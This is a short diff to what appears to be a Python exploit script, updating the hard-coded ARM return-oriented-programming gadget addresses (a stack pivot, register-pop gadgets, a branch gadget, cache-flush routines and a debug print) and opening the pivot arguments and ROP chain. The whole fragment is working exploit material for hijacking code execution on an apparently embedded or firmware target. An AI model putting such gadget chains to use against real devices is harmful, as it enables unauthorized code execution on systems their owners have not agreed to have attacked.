@@ -33,16 +33,15 @@ def main():
 		exit(-1)
 
 	temp_store = 0x511671A0
-
-	pivot = 0x51014f10 # e890b672 ldm r0, {r1, r4, r5, r6, r9, sl, ip, sp, pc}
-	pop_pc = 0x5100155f
-	pop_r0_pc = 0x5100fa31
-	pop_r1_r2_r4_r6_pc = 0x51024b87
-	blx_r3_pop_r3_pc = 0x51010033
-	pop_r3_pc = 0x51010035
-	flush_icache = 0x51014521 # ICIALLUIS
-	clean_dcache = 0x5101456D
-	debug_printf = 0x51012BD5
+	pivot = 0x5101504C # e890b672 ldm r0, {r1, r4, r5, r6, r9, sl, ip, sp, pc}
+	pop_pc = 0x5100155F
+	pop_r0_pc = 0x5100E4D1
+	pop_r1_r2_r4_r6_pc = 0x51024C53
+	blx_r3_pop_r3_pc = 0x510058AF
+	pop_r3_pc = 0x510058B1
+	flush_icache = 0x51014691 # ICIALLUIS
+	clean_dcache = 0x510146DD
+	debug_printf = 0x51012D45
 
 	pivot_args = [0, 0, 0, 0, 0, 0, 0, temp_store + 0x40, pop_pc]
 	rop = [
